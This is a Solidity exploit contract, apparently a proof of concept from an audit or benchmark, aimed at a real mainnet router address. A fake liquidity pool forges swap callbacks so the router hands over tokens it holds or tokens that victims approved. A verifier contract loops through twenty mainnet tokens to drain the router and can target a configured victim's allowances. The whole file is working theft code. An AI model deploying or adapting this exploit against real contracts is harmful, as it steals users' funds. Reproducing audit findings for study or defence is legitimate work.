// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes calldata route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;

    function tridentCLSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract MaliciousConcentratedLiquidityPool {
    address internal immutable VERIFIER;
    address internal immutable TARGET_ROUTER;

    address internal forgedToken;
    address internal forgedFrom;
    address internal beneficiary;
    bool internal useTridentCallback;

    constructor(address verifier_, address router_) {
        VERIFIER = verifier_;
        TARGET_ROUTER = router_;
    }

    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
        require(msg.sender == VERIFIER, "not verifier");
        forgedToken = token_;
        forgedFrom = from_;
        beneficiary = beneficiary_;
        useTridentCallback = useTrident_;
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bytes calldata
    ) external returns (int256 amount0, int256 amount1) {
        require(msg.sender == TARGET_ROUTER, "not router");

        uint256 amountToPull = _positiveAmount(amountSpecified);
        _invokeForgedCallback(amountToPull);
        _sweepToBeneficiary();

        amount0 = int256(amountToPull);
        amount1 = -int256(amountToPull);
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bool,
        bytes calldata
    ) external returns (int256 amount0, int256 amount1) {
        require(msg.sender == TARGET_ROUTER, "not router");

        uint256 amountToPull = _positiveAmount(amountSpecified);
        _invokeForgedCallback(amountToPull);
        _sweepToBeneficiary();

        amount0 = int256(amountToPull);
        amount1 = -int256(amountToPull);
    }

    function _invokeForgedCallback(uint256 amountToPull) internal {
        // The exploit keeps the finding's original causality:
        // 1. the attacker-controlled route points to an arbitrary V3/CL pool,
        // 2. the router stores that pool in lastCalledPool,
        // 3. the malicious pool immediately forges callback data as (token, victimOrRouter),
        // 4. the router transfers approved victim funds or router-held funds to this fake pool.
        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);

        if (useTridentCallback) {
            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
        } else {
            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
        }
    }

    function _sweepToBeneficiary() internal {
        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
        if (stolen > 0) {
            _safeTransfer(forgedToken, beneficiary, stolen);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
        require(amountSpecified > 0, "non-positive amount");
        return uint256(amountSpecified);
    }
}

contract FlawVerifier {
    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;

    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
    uint8 internal constant POOL_UNIV3 = 1;
    uint8 internal constant POOL_TRIDENT_CL = 5;

    address internal immutable POOL;

    address internal storedProfitToken;
    uint256 internal storedProfitAmount;

    address public configuredVictim;
    address public configuredVictimToken;

    constructor() {
        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
    }

    function executeOnOpportunity() external {
        if (storedProfitAmount != 0) {
            return;
        }

        if (_drainRouterBalances(false)) {
            return;
        }

        if (_drainRouterBalances(true)) {
            return;
        }

        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
                return;
            }

            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
        }
    }

    function configureVictim(address victim, address token) external {
        configuredVictim = victim;
        configuredVictimToken = token;
    }

    function profitToken() external view returns (address) {
        return storedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return storedProfitAmount;
    }

    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
        address[20] memory candidates = [
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
            0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9, // AAVE
            0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2, // MKR
            0xc00e94Cb662C3520282E6f5717214004A7f26888, // COMP
            0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F, // SNX
            0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, // UNI
            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
            0x111111111117dC0aa78b770fA6A738034120C302, // 1INCH
            0x0D8775F648430679A709E98d2b0Cb6250d2887EF, // BAT
            0xE41d2489571d322189246DaFA5ebDe1F4699F498, // ZRX
            0x0000000000085d4780B73119b644AE5ecd22b376, // TUSD
            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0  // LUSD
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            uint256 routerBalance = _safeBalanceOf(token, ROUTER);
            if (routerBalance <= 1) {
                continue;
            }

            if (_attemptRouterDrain(token, useTridentCallback)) {
                return true;
            }
        }

        return false;
    }

    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);

        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
        uint256 allowance = _safeAllowance(token, victim, ROUTER);
        uint256 balance = _safeBalanceOf(token, victim);
        uint256 amountToPull = allowance < balance ? allowance : balance;
        if (amountToPull == 0) {
            return false;
        }

        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);

        bytes memory route = _buildVictimRoute(token, useTridentCallback);
        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = _safeBalanceOf(token, address(this));
        if (afterBalance > beforeBalance) {
            storedProfitToken = token;
            storedProfitAmount = afterBalance - beforeBalance;
            return true;
        }

        return false;
    }

    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
        return abi.encodePacked(
            uint8(COMMAND_PROCESS_MY_ERC20),
            token,
            uint8(1),
            uint16(65535),
            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
            POOL,
            uint8(1),
            address(this)
        );
    }

    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
        return abi.encodePacked(
            uint8(COMMAND_PROCESS_USER_ERC20),
            token,
            uint8(1),
            uint16(65535),
            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
            POOL,
            uint8(1),
            address(this)
        );
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}
